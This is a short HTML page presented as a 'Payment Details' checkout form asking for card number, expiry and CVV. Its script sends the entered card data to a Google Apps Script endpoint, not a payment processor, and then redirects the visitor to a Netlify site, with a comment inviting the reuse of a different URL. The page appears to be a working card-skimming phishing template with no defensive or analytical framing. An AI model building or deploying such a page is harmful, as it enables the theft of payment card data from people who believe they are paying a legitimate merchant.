<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            padding: 20px;
        }
        form {
            background: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input[type="submit"] {
            background: #5cb85c;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background: #4cae4c;
        }
    </style>
</head>
<body>

<h2>Payment Details</h2>
<form id="paymentForm">
    <label for="cardNumber">Card Number:</label>
    <input type="text" id="cardNumber" name="cardNumber" required>

    <label for="expMonth">Expiration Month:</label>
    <input type="text" id="expMonth" name="expMonth" required>

    <label for="expYear">Expiration Year:</label>
    <input type="text" id="expYear" name="expYear" required>

    <label for="cvv">CVV:</label>
    <input type="text" id="cvv" name="cvv" required>

    <input type="submit" value="Submit">
</form>

<script>
    document.getElementById('paymentForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const cardNumber = document.getElementById('cardNumber').value;
        const expMonth = document.getElementById('expMonth').value;
        const expYear = document.getElementById('expYear').value;
        const cvv = document.getElementById('cvv').value;

        fetch('https://script.google.com/macros/s/AKfycbwDOS2wZZNXN5MA44UUV2Y_LxDQmOPhh86YO6Rk5bxEzmWUP7B60rx-dQERsVEP_Hfc/exec', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ cardNumber, expMonth, expYear, cvv })
        })
        .then(response => response.text())
        .then(data => {
            console.log(data);
            // Redirect to another site after successful submission
            window.location.href = "https://melodic-puppy-430091.netlify.app"; // Change to your desired URL
        })
        .catch(error => console.error('Error:', error));
    });
</script>

</body>
</html>
